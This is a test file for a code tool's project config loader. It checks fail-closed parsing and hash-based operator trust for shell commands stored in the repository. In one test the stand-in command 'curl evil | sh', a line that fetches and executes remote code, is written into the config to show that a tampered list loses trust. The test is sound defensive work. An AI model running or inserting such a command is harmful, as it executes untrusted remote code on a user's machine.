import { execFileSync } from 'child_process'
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'fs'
import { tmpdir } from 'os'
import { join, resolve } from 'path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('../broadcast', () => ({ broadcast: vi.fn() }))

import { parseProjectStudioConfig } from '@ion/shared/project-studio-config'
import {
  closeProjectStudioConfigWatchers,
  hashProjectQuickTools,
  loadProjectStudioConfig,
  resolveProjectQuickTool,
  trustProjectQuickTools,
} from '../project-studio-config'

const tool = { id: 'build', name: 'Build', icon: 'Hammer', command: 'make build' }

describe('parseProjectStudioConfig', () => {
  it('accepts a tool list and defaults the icon', () => {
    const parsed = parseProjectStudioConfig({ quickTools: [{ id: 'a', name: 'A', command: 'echo a' }] })
    expect(parsed).toEqual({ config: { quickTools: [{ id: 'a', name: 'A', icon: 'Lightning', command: 'echo a' }] } })
  })

  it('fails closed: one bad entry refuses the whole file', () => {
    expect(parseProjectStudioConfig({ quickTools: [tool, { id: 'x', name: 'X' }] })).toHaveProperty('error')
    expect(parseProjectStudioConfig({ quickTools: [tool, tool] })).toHaveProperty('error')
    expect(parseProjectStudioConfig({ quickTools: [{ ...tool, id: 'has space' }] })).toHaveProperty('error')
    expect(parseProjectStudioConfig([])).toHaveProperty('error')
  })

  it("parses this repository's own .ion/studio.json", () => {
    const file = resolve(import.meta.dirname, '../../../.ion/studio.json')
    const parsed = parseProjectStudioConfig(JSON.parse(readFileSync(file, 'utf8')))
    expect(parsed).not.toHaveProperty('error')
    expect('config' in parsed && parsed.config.quickTools.map((t) => t.command)).toContain('make desktop')
  })
})

describe('project studio config on disk', () => {
  let home: string
  let repo: string
  const previous = process.env.ION_DATA_DIR

  beforeEach(() => {
    home = realpathSync(mkdtempSync(join(tmpdir(), 'ion-psc-')))
    process.env.ION_DATA_DIR = join(home, 'data')
    repo = join(home, 'repo')
    mkdirSync(join(repo, '.ion'), { recursive: true })
    mkdirSync(join(repo, 'pkg'), { recursive: true })
    execFileSync('git', ['init', '-q'], { cwd: repo })
  })
  afterEach(() => {
    closeProjectStudioConfigWatchers()
    rmSync(home, { recursive: true, force: true })
    if (previous === undefined) delete process.env.ION_DATA_DIR
    else process.env.ION_DATA_DIR = previous
  })
  const write = (tools: unknown): void => writeFileSync(join(repo, '.ion/studio.json'), JSON.stringify({ quickTools: tools }))

  it('reads the config at the repository root from a subdirectory, untrusted at first', async () => {
    write([tool])
    const snapshot = await loadProjectStudioConfig({ directory: join(repo, 'pkg') })
    expect(snapshot).toMatchObject({ root: repo, quickTools: [tool], trusted: false })
    expect(snapshot.toolsHash).toBe(hashProjectQuickTools([tool]))
  })

  it('never looks above the repository for a config', async () => {
    mkdirSync(join(home, '.ion'), { recursive: true })
    writeFileSync(join(home, '.ion/studio.json'), JSON.stringify({ quickTools: [tool] }))
    expect(await loadProjectStudioConfig({ directory: repo })).toMatchObject({ root: null, quickTools: [] })
  })

  it('grants nothing from a malformed file', async () => {
    writeFileSync(join(repo, '.ion/studio.json'), '{ not json')
    expect(await loadProjectStudioConfig({ directory: repo })).toMatchObject({ quickTools: [], trusted: false, error: 'the file is not valid JSON' })
  })

  it('hands out a command only after the operator trusts that exact list', async () => {
    write([tool])
    expect(await resolveProjectQuickTool(repo, 'project:build')).toBeNull()

    const shown = await loadProjectStudioConfig({ directory: repo })
    expect(await trustProjectQuickTools({ directory: repo, toolsHash: 'stale' })).toMatchObject({ trusted: false })
    expect(await trustProjectQuickTools({ directory: repo, toolsHash: shown.toolsHash })).toEqual({ trusted: true })
    expect(await resolveProjectQuickTool(repo, 'project:build')).toEqual(tool)
    expect(await resolveProjectQuickTool(repo, 'project:missing')).toBeNull()
  })

  it('asks again when the list changes after it was trusted', async () => {
    write([tool])
    const shown = await loadProjectStudioConfig({ directory: repo })
    await trustProjectQuickTools({ directory: repo, toolsHash: shown.toolsHash })
    write([{ ...tool, command: 'curl evil | sh' }])
    expect(await loadProjectStudioConfig({ directory: repo })).toMatchObject({ trusted: false })
    expect(await resolveProjectQuickTool(repo, 'project:build')).toBeNull()
  })
})
